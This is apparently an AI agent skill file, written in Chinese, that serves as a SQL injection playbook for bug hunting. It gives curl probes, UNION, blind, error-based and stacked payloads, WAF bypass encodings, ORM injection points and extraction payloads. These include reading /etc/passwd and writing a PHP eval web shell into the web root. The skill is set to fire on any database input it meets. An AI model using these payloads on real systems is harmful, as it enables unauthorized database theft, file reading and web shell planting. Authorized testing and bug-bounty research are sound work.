---
name: sqli-pwn
description: SQL注入全类型挖掘——UNION/盲注/报错/WAF绕过。Use when 看到?id=/搜索框/排序参数/任何数据库交互点。
---

# SQL 注入挖掘

> 蒸馏自CC挖洞武器库 sqli-orm-完整手册（实战验证）

## 快速检测（30秒）

```bash
# 基础探测（单引号/布尔/时间）
curl "http://T/?id=1'" -o /tmp/a.txt -w "%{size_download}\n"
curl "http://T/?id=1' and 1=1-- -" -o /tmp/b.txt -w "%{size_download}\n"
curl "http://T/?id=1' and 1=2-- -" -o /tmp/c.txt -w "%{size_download}\n"
# b vs c 长度/内容不同 = 布尔盲注；报错信息 = 报错注入
```

## 注入类型速查

| 类型 | 特征 | 验证 |
|---|---|---|
| UNION | 列数匹配后可回显 | `ORDER BY N` 找列数 → `UNION SELECT 1,2,3` |
| 布尔盲注 | 页面差异 | `and 1=1` vs `and 1=2` |
| 时间盲注 | 响应延迟 | `sleep(5)` / `WAITFOR DELAY '0:0:5'` |
| 报错注入 | 数据库错误回显 | `extractvalue(1,concat(0x7e,version()))` / `updatexml` |
| 堆叠注入 | 多语句 | `;select ...`（需支持） |
| 二次注入 | 存储后触发 | 注册用户名含payload → 管理页触发 |

## 数据库指纹

```bash
# 版本
MySQL: version() / @@version
MSSQL: @@version
Oracle: banner from v$version
Postgres: version()
# 注释符：MySQL支持#和-- -；MSSQL/Oracle只支持-- -
# 字符串：MySQL单双引号；MSSQL双引号是标识符
```

## WAF 绕过（被拦时）

```
空格 → /**/、%0a、%09、+（注意编码）
union select → u/**/nion s/**/elect、UNION%0aSELECT、大小写混合
or/and → || 、&& 、%6f%72
注释 -- → #、--+、--%20、;%00
等值 → like、in、between、regexp
函数替换：substr→substring/mid、sleep→benchmark、concat→concat_ws
```

## ORM 注入（MyBatis/JPA/HQL）

- MyBatis `${}` 是拼接（危险）、`#{}` 是预编译（安全）——找 `${}` 参数
- HQL：实体类名/属性名注入，`from User u where u.name='' or 1=1`
- 排序/分组参数常拼接：`order by`、`group by`、`limit`

## 数据提取（确认后）

```bash
# 当前库/表/列
UNION SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()
# 读文件（MySQL，FILE权限）
UNION SELECT load_file('/etc/passwd')
# 写shell（慎用，授权环境）
SELECT '<?php @eval($_POST[x]);?>' INTO OUTFILE '/var/www/html/s.php'
```

## 提交要点

- 危害：能读库 = 高危；仅探测 = 低危。有数据泄露证据才报
- 证据：注入payload + 响应差异 同屏
